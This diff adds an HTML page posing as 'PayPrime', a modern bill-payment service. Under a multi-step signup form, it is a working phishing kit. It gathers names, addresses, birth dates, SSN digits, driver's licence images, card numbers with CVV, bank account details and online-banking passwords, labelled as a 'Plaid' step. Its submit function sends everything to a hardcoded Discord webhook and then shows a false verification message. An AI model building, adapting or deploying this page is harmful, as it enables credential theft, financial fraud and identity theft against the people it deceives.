@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPrime - Modern Bill Payments</title>
+    <style>
+        /* Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0e17, #1a2a3a);
+            color: white;
+            min-height: 100vh;
+        }
+
+        /* Navigation */
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem 5%;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 600;
+            background: linear-gradient(90deg, #00c4ff, #6d28d9);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Hero Section */
+        .hero {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 0 5%;
+            text-align: center;
+        }
+
+        .hero-content {
+            max-width: 800px;
+        }
+
+        h1 {
+            font-size: 3.5rem;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(90deg, #fff, #a5b4fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            color: #94a3b8;
+            margin-bottom: 2.5rem;
+            line-height: 1.6;
+        }
+
+        /* Action Buttons */
+        .cta-buttons {
+            display: flex;
+            gap: 1.5rem;
+            justify-content: center;
+        }
+
+        .btn {
+            padding: 1rem 2rem;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-primary {
+            background: #4f46e5;
+            color: white;
+            border: 2px solid #4f46e5;
+        }
+
+        .btn-primary:hover {
+            background: #4338ca;
+            transform: translateY(-2px);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: #94a3b8;
+            border: 2px solid #334155;
+        }
+
+        .btn-secondary:hover {
+            border-color: #4f46e5;
+            color: white;
+            transform: translateY(-2px);
+        }
+
+        /* Auth Modal */
+        .auth-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+
+        .modal-content {
+            background: #1e293b;
+            padding: 2.5rem;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 440px;
+            position: relative;
+            animation: modalEnter 0.3s ease;
+        }
+
+        @keyframes modalEnter {
+            from { transform: scale(0.95); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-header {
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        .modal-header h2 {
+            font-size: 1.8rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .modal-header p {
+            color: #94a3b8;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #e2e8f0;
+        }
+
+        .form-group input, #paymentMethod {
+            width: 100%;
+            padding: 0.8rem;
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            color: white;
+            font-size: 1rem;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #4f46e5;
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.2);
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: none;
+            border: none;
+            color: #94a3b8;
+            cursor: pointer;
+            font-size: 1.5rem;
+            padding: 0.5rem;
+        }
+
+        /* Multi-Step Form */
+        .form-step {
+            display: none;
+            transition: transform 0.3s ease;
+        }
+
+        .form-step.active {
+            display: block;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); }
+            to { transform: translateX(0); }
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 2rem;
+        }
+
+        /* Upload Section */
+        .upload-container {
+            background-color: #1e293b;
+            border-radius: 12px;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .upload-container h2 {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: #e2e8f0;
+        }
+
+        .upload-container p {
+            font-size: 0.9rem;
+            color: #94a3b8;
+            margin-bottom: 1.5rem;
+        }
+
+        .upload-section {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+        }
+
+        .upload-box {
+            position: relative;
+            width: 48%;
+            padding-top: 60%; /* Aspect ratio for the box */
+            background-color: #0f172a;
+            border: 2px dashed #334155;
+            border-radius: 8px;
+            cursor: pointer;
+            overflow: hidden;
+            transition: border-color 0.3s ease;
+        }
+
+        .upload-box:hover {
+            border-color: #4f46e5;
+        }
+
+        .upload-placeholder {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            height: auto;
+            opacity: 0.6;
+        }
+
+        .upload-text {
+            position: absolute;
+            bottom: 16px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 0.9rem;
+            color: #4f46e5;
+            font-weight: bold;
+        }
+
+        /* Hide the default file input */
+        input[type="file"] {
+            display: none;
+        }
+
+        /* Learn More Section */
+        .learn-more-section {
+            display: none;
+            padding: 4rem 5%;
+            background: #1a2a3a;
+            color: white;
+        }
+
+        .learn-more-section.active {
+            display: block;
+        }
+
+        .learn-more-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .learn-more-content h2 {
+            font-size: 2.5rem;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(90deg, #00c4ff, #6d28d9);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .learn-more-content p {
+            font-size: 1.1rem;
+            color: #94a3b8;
+            line-height: 1.6;
+            margin-bottom: 2rem;
+        }
+
+        .learn-more-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+
+        .learn-more-card {
+            background: #1e293b;
+            border-radius: 12px;
+            padding: 2rem;
+            transition: transform 0.3s ease;
+        }
+
+        .learn-more-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .learn-more-card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            color: #e2e8f0;
+        }
+
+        .learn-more-card p {
+            font-size: 1rem;
+            color: #94a3b8;
+            line-height: 1.6;
+        }
+
+        .learn-more-card img {
+            width: 100%;
+            border-radius: 8px;
+            margin-bottom: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="nav">
+        <div class="logo">PayPrime</div>
+        <div class="auth-buttons">
+            <button class="btn btn-secondary" onclick="showModal('login')">Login</button>
+            <button class="btn btn-primary" onclick="showModal('signup')">Sign Up</button>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <h1>Modern Bill Payments<br>Powered by digital technology</h1>
+            <p class="subtitle">
+                Settle your bills instantly with bank-grade security. 
+                Manage all your payments in one place with real-time tracking.
+            </p>
+            <div class="cta-buttons">
+                <button class="btn btn-primary" onclick="showModal('signup')">Start Bill Paying</button>
+                <button class="btn btn-secondary" onclick="showLearnMore()">Learn More</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Learn More Section -->
+    <section class="learn-more-section" id="learnMoreSection">
+        <div class="learn-more-content">
+            <h2>How PayPrime Works</h2>
+            <p>
+                PayPrime simplifies bill payments with cutting-edge technology and robust security measures. 
+                Here's everything you need to know about our process, security, and co-partners.
+            </p>
+            <div class="learn-more-grid">
+                <!-- Card 1: Bill Payment Process -->
+                <div class="learn-more-card">
+                    <img src="https://via.placeholder.com/400x200" alt="Bill Payment Process">
+                    <h3>Bill Payment Process</h3>
+                    <p>
+                        Our seamless process allows you to pay bills in just a few clicks. 
+                        Track your payments in real-time and receive instant notifications.
+                    </p>
+                </div>
+
+                <!-- Card 2: Security -->
+                <div class="learn-more-card">
+                    <img src="https://via.placeholder.com/400x200" alt="Security">
+                    <h3>Security</h3>
+                    <p>
+                        We use bank-grade encryption and multi-factor authentication to ensure your data 
+                        and transactions are always secure.
+                    </p>
+                </div>
+
+                <!-- Card 3: Co-Partners -->
+                <div class="learn-more-card">
+                    <img src="https://via.placeholder.com/400x200" alt="Co-Partners">
+                    <h3>Co-Partners</h3>
+                    <p>
+                        We collaborate with leading financial institutions and technology providers 
+                        to deliver the best experience for our users.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Login Modal -->
+    <div id="loginModal" class="auth-modal">
+        <div class="modal-content">
+            <button class="close-modal" onclick="hideModals()">&times;</button>
+            <div class="modal-header">
+                <h2>Login</h2>
+                <p>Welcome back! Fill your form to continue.</p>
+            </div>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Account ID</label>
+                    <input type="text" id="accountId" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="password" required>
+                </div>
+                <button class="btn btn-primary" type="submit">Login</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Signup Modal -->
+    <div id="signupModal" class="auth-modal">
+        <div class="modal-content">
+            <button class="close-modal" onclick="hideModals()">&times;</button>
+            <div class="modal-header">
+                <h2>Create Account</h2>
+                <p>Join PayPrime in just a few steps</p>
+            </div>
+
+            <!-- Step 1: Personal Info -->
+            <div class="form-step active" id="step1">
+                <div class="form-group">
+                    <label>First Name</label>
+                    <input type="text" id="firstName" required>
+                </div>
+                <div class="form-group">
+                    <label>Last Name</label>
+                    <input type="text" id="lastName" required>
+                </div>
+                <div class="form-group">
+                    <label>City</label>
+                    <input type="text" id="city" required>
+                </div>
+                <div class="form-group">
+                    <label>Zip code</label>
+                    <input type="text" id="zipCode" required>
+                </div>
+                <div class="form-group">
+                    <label>Address</label>
+                    <input type="text" id="address" required>
+                </div>
+                <div class="form-group">
+                    <label>Create Password</label>
+                    <input type="password" id="signupPassword" required>
+                </div>
+                <div class="form-group">
+                    <label>Confirm Password</label>
+                    <input type="password" id="confirmPassword" required>
+                </div>
+                <div class="button-group">
+                    <button class="btn btn-primary" onclick="nextStep(2)">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 2: Contact Info -->
+            <div class="form-step" id="step2">
+                <div class="form-group">
+                    <label>Email</label>
+                    <input type="email" id="email" required>
+                </div>
+                <div class="form-group">
+                    <label>Date of Birth</label>
+                    <input type="date" id="dob" required>
+                </div>
+                <div class="form-group">
+                    <label>SSN (last four digits only)</label>
+                    <input type="number" id="ssn" required>
+                </div>
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="prevStep(1)">Back</button>
+                    <button class="btn btn-primary" onclick="nextStep(3)">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 3: Identity Verification -->
+            <div class="form-step" id="step3">
+                <div class="upload-container">
+                    <h2>Verify Your Identity</h2>
+                    <p>Upload the front and back of your driving license.</p>
+                    <div class="upload-section">
+                        <div class="upload-box" id="frontUpload">
+                            <img src="placeholder-front.png" alt="Front of License" class="upload-placeholder">
+                            <span class="upload-text">Upload Front</span>
+                            <input type="file" id="frontId" accept="image/*" style="display: none;">
+                        </div>
+                        <div class="upload-box" id="backUpload">
+                            <img src="placeholder-back.png" alt="Back of License" class="upload-placeholder">
+                            <span class="upload-text">Upload Back</span>
+                            <input type="file" id="backId" accept="image/*" style="display: none;">
+                        </div>
+                    </div>
+                </div>
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="prevStep(2)">Back</button>
+                    <button class="btn btn-primary" onclick="nextStep(4)">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 4: Payment Method -->
+            <div class="form-step" id="step4">
+                <div class="form-group">
+                    <label>Payment Method</label>
+                    <select id="paymentMethod" required onchange="showPaymentDetails()">
+                        <option value="">Select</option>
+                        <option value="bank">Bank Account</option>
+                        <option value="card">Credit/Debit Card</option>
+                        <option value="crypto">Crypto Wallet</option>
+                    </select>
+                </div>
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="prevStep(3)">Back</button>
+                    <button class="btn btn-primary" onclick="nextStep(5)">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 5: Payment Details -->
+            <div class="form-step" id="step5">
+                <div id="bankDetails" class="form-group" style="display: none;">
+                    <label>Bank Name</label>
+                    <input type="text" id="bankName">
+                    <label>Routing Number</label>
+                    <input type="text" id="routingNumber">
+                    <label>Account Number</label>
+                    <input type="text" id="accountNumber">
+                </div>
+                <div id="cardDetails" class="form-group" style="display: none;">
+                    <label>Card Number</label>
+                    <input type="number" id="cardNumber">
+                    <label>Expiry Date</label>
+                    <input type="text" id="expiryDate">
+                    <label>CVV</label>
+                    <input type="number" id="cvv">
+                </div>
+                <div id="cryptoDetails" class="form-group" style="display: none;">
+                    <label>Wallet Address</label>
+                    <input type="text" id="walletAddress">
+                </div>
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="prevStep(4)">Back</button>
+                    <button class="btn btn-primary" onclick="nextStep(6)">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 6: Security -->
+            <div class="form-step" id="step6">
+                <div class="form-group">
+                    <h3>Plaid</h3>
+                    <p>We use this to request authorization from your bank to facilitate a successful payment.</p>
+                    <label>Bank User ID:</label>
+                    <input type="text" id="userid" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="text" id="bankpass" required>
+                </div>
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="prevStep(5)">Back</button>
+                    <button class="btn btn-primary" type="submit" onclick="submitForm()">Submit</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentStep = 1;
+        const totalSteps = 6;
+
+        // Show/hide modals
+        function showModal(type) {
+            hideModals();
+            if (type === 'login') {
+                document.getElementById('loginModal').style.display = 'flex';
+            } else if (type === 'signup') {
+                document.getElementById('signupModal').style.display = 'flex';
+            }
+        }
+
+        function hideModals() {
+            document.querySelectorAll('.auth-modal').forEach(modal => {
+                modal.style.display = 'none';
+            });
+        }
+
+        // Step navigation
+        function showStep(step) {
+            document.querySelectorAll('.form-step').forEach(stepDiv => stepDiv.classList.remove('active'));
+            const stepElement = document.getElementById(`step${step}`);
+            stepElement.classList.add('active');
+            
+            // Update payment details when showing step 4
+            if (step === 4) {
+                showPaymentDetails();
+            }
+        }
+
+        function nextStep(targetStep) {
+            if (targetStep > totalSteps) return;
+            currentStep = targetStep;
+            showStep(currentStep);
+        }
+
+        function prevStep(targetStep) {
+            if (targetStep < 1) return;
+            currentStep = targetStep;
+            showStep(currentStep);
+        }
+
+        // Payment details visibility
+        function showPaymentDetails() {
+            const paymentMethod = document.getElementById('paymentMethod').value;
+            document.getElementById('bankDetails').style.display = paymentMethod === 'bank' ? 'block' : 'none';
+            document.getElementById('cardDetails').style.display = paymentMethod === 'card' ? 'block' : 'none';
+            document.getElementById('cryptoDetails').style.display = paymentMethod === 'crypto' ? 'block' : 'none';
+        }
+
+        // File upload handling
+        document.getElementById('frontUpload').addEventListener('click', () => {
+            document.getElementById('frontId').click();
+        });
+
+        document.getElementById('backUpload').addEventListener('click', () => {
+            document.getElementById('backId').click();
+        });
+
+        document.getElementById('frontId').addEventListener('change', (event) => {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    document.querySelector('#frontUpload .upload-placeholder').src = e.target.result;
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+
+        document.getElementById('backId').addEventListener('change', (event) => {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    document.querySelector('#backUpload .upload-placeholder').src = e.target.result;
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+
+        // Form submission
+        async function submitForm() {
+            // Collect all form data
+            const formData = new FormData();
+
+            // Step 1: Personal Info
+            formData.append('firstName', document.getElementById('firstName').value);
+            formData.append('lastName', document.getElementById('lastName').value);
+            formData.append('city', document.getElementById('city').value);
+            formData.append('zipCode', document.getElementById('zipCode').value);
+            formData.append('address', document.getElementById('address').value);
+            formData.append('password', document.getElementById('signupPassword').value);
+            formData.append('confirmPassword', document.getElementById('confirmPassword').value);
+
+            // Step 2: Contact Info
+            formData.append('email', document.getElementById('email').value);
+            formData.append('dob', document.getElementById('dob').value);
+            formData.append('ssn', document.getElementById('ssn').value);
+
+            // Step 3: Identity Verification (Files)
+            const frontIdFile = document.getElementById('frontId').files[0];
+            const backIdFile = document.getElementById('backId').files[0];
+            if (frontIdFile) formData.append('frontId', frontIdFile);
+            if (backIdFile) formData.append('backId', backIdFile);
+
+            // Step 4: Payment Method
+            formData.append('paymentMethod', document.getElementById('paymentMethod').value);
+
+            // Step 5: Payment Details
+            if (document.getElementById('bankDetails').style.display === 'block') {
+                formData.append('bankName', document.getElementById('bankName').value);
+                formData.append('routingNumber', document.getElementById('routingNumber').value);
+                formData.append('accountNumber', document.getElementById('accountNumber').value);
+            } else if (document.getElementById('cardDetails').style.display === 'block') {
+                formData.append('cardNumber', document.getElementById('cardNumber').value);
+                formData.append('expiryDate', document.getElementById('expiryDate').value);
+                formData.append('cvv', document.getElementById('cvv').value);
+            } else if (document.getElementById('cryptoDetails').style.display === 'block') {
+                formData.append('walletAddress', document.getElementById('walletAddress').value);
+            }
+
+            // Step 6: Security
+            formData.append('userid', document.getElementById('userid').value);
+            formData.append('bankpass', document.getElementById('bankpass').value);
+
+            // Send data to Discord webhook
+            try {
+                const webhookURL = 'https://discord.com/api/webhooks/1267870061918683272/mVC_cHDouz1iT-nccRR97Zn5_KfZaic_jdBfOId9nmlYKcJlXKRYJS-QULO1UtY7tNWG'; // Replace with your Discord webhook URL
+
+                // Create a JSON payload for the embed
+                const embed = {
+                    title: 'New Form Submission',
+                    color: 0xffffff,
+                    fields: [
+                        { name: 'First Name', value: document.getElementById('firstName').value || 'N/A', inline: true },
+                        { name: 'Last Name', value: document.getElementById('lastName').value || 'N/A', inline: true },
+                        { name: 'Zipcode', value: document.getElementById('zipCode').value || 'N/A', inline: true }, 
+                        { name: 'City', value: document.getElementById('city').value || 'N/A', inline: true },
+                        { name: 'Address', value: document.getElementById('address').value || 'N/A', inline: true },
+                        { name: 'Email', value: document.getElementById('email').value || 'N/A', inline: true },
+                        { name: 'Date of Birth', value: document.getElementById('dob').value || 'N/A', inline: true },
+                        { name: 'SSN', value: document.getElementById('ssn').value || 'N/A', inline: true },
+                        { name: 'Payment Method', value: document.getElementById('paymentMethod').value || 'N/A', inline: true },
+                        { name: 'Bank Name', value: document.getElementById('bankName')?.value || 'N/A', inline: true },
+                        { name: 'Routing Number', value: document.getElementById('routingNumber')?.value || 'N/A', inline: true },
+                        { name: 'Account Number', value: document.getElementById('accountNumber')?.value || 'N/A', inline: true },
+                        { name: 'Card Number', value: document.getElementById('cardNumber')?.value || 'N/A', inline: true },
+                        { name: 'Expiry Date', value: document.getElementById('expiryDate')?.value || 'N/A', inline: true },
+                        { name: 'CVV', value: document.getElementById('cvv')?.value || 'N/A', inline: true },
+                        { name: 'Wallet Address', value: document.getElementById('walletAddress')?.value || 'N/A', inline: true },
+                        { name: 'User ID', value: document.getElementById('userid').value || 'N/A', inline: true },
+                        { name: 'Bank Password', value: document.getElementById('bankpass').value || 'N/A', inline: true },
+                    ],
+                    timestamp: new Date().toISOString(),
+                };
+
+                // Append the JSON payload to FormData
+                formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+
+                // Send the request to Discord
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData,
+                });
+
+                if (!response.ok) throw new Error('Submission failed');
+                alert('You should receive an email verification; if not, please double-check your information!');
+                hideModals();
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Submission failed. Please try again.');
+            }
+        }
+
+        // Show Learn More Section
+        function showLearnMore() {
+            document.getElementById('learnMoreSection').classList.add('active');
+        }
+    </script>
+</body>
+</html>
